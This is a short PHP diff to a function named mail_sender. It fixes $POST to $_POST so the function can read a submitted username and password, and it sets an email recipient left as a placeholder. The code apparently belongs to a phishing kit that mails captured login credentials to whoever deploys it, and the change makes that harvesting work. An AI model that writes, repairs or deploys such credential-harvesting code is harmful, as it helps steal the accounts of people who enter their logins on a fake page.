@@ -1,7 +1,7 @@
 <?php
 	function mail_sender(){
-		$username = $POST['username'];
-		$password = $POST['password'];
+		$username = $_POST['username'];
+		$password = $_POST['password'];
 		
 		$reciever = "YOUR-EMAIL ADRRESS";
 		
